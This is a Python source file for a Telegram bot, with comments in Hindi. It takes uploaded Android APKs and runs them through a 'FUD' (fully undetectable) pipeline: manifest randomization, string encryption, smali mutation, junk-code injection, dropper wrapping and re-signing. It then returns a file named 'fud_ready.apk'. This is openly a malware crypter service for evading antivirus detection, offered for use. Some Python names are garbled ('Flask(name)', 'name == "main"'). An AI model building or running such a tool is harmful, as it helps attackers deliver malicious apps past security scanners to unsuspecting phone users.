import os
import asyncio
import uuid
import shutil
from flask import Flask
import threading
from telegram import Update, Document
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# सभी मॉड्यूल्स सीधे इम्पोर्ट करें
from apktool_wrapper import decompile, recompile
from dex_mutator import mutate_smali
from encryptor import encrypt_strings
from manifest import randomize_manifest
from junk_injector import inject_junk
from dropper import wrap_as_dropper
from signer import sign_apk
from config import BOT_TOKEN, WORK_DIR

# ---------- FUD Pipeline ----------
def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    decompiled_dir = os.path.join(session_dir, "decompiled")

    decompile(input_apk, decompiled_dir)
    randomize_manifest(decompiled_dir)
    encrypt_strings(decompiled_dir)
    mutate_smali(decompiled_dir)
    inject_junk(decompiled_dir)

    unsigned_apk = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled_dir, unsigned_apk)

    dropped_apk = os.path.join(session_dir, "dropped.apk")
    wrap_as_dropper(unsigned_apk, dropped_apk, session_dir)

    sign_apk(dropped_apk, output_apk)
    return output_apk

# ---------- Flask Server (Render के लिए) ----------
flask_app = Flask(name)

@flask_app.route('/')
def home():
    return "FUD Bot is alive! 🤖"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host='0.0.0.0', port=port)

def start_flask():
    threading.Thread(target=run_flask).start()

# ---------- Telegram Bot Handler ----------
async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /start कमांड हैंडल करें
    if update.message.text and update.message.text.startswith('/start'):
        await update.message.reply_text(
            "🤖 *FUD APK Processor Bot*\n\n"
            "Send me an APK file and I'll process it with FUD techniques.\n\n"
            "⚙️ Features:\n"
            "• Manifest Randomization\n"
            "• String Encryption\n"
            "• Smali Mutation\n"
            "• Junk Injection\n"
            "• Dropper Wrapper\n"
            "• APK Signing\n\n"
            "📤 Just send any APK file!",
            parse_mode='Markdown'
        )
        return

    # APK file handle करें
    doc: Document = update.message.document
    if not doc or not doc.file_name.endswith(".apk"):
        await update.message.reply_text("❌ Please send a valid APK file.")
        return

    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)

    input_path = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "fud_output.apk")

    await update.message.reply_text("⚙️ Processing your APK... This may take a few minutes.")

    try:
        file = await context.bot.get_file(doc.file_id)
        await file.download_to_drive(input_path)
        
        result_path = await asyncio.to_thread(full_fud_pipeline, input_path, output_path, session_dir)
        
        # Result भेजें
        await update.message.reply_document(
            document=open(result_path, "rb"), 
            filename="fud_ready.apk"
        )
        await update.message.reply_text("✅ APK processed successfully!")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)

# ---------- Main Function ----------
def main():
    os.makedirs(WORK_DIR, exist_ok=True)
    start_flask()

    print(f"🤖 Starting bot with token: {BOT_TOKEN[:10]}...")  # Token का पहला हिस्सा दिखाएं (सुरक्षा के लिए)
    
    # नया तरीका (ApplicationBuilder की जगह Application)
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers जोड़ें
    application.add_handler(MessageHandler(filters.ALL, handle_apk))
    
    print("🤖 FUD Bot is live on Telegram... Waiting for messages...")
    application.run_polling()

if name == "main":
    main()
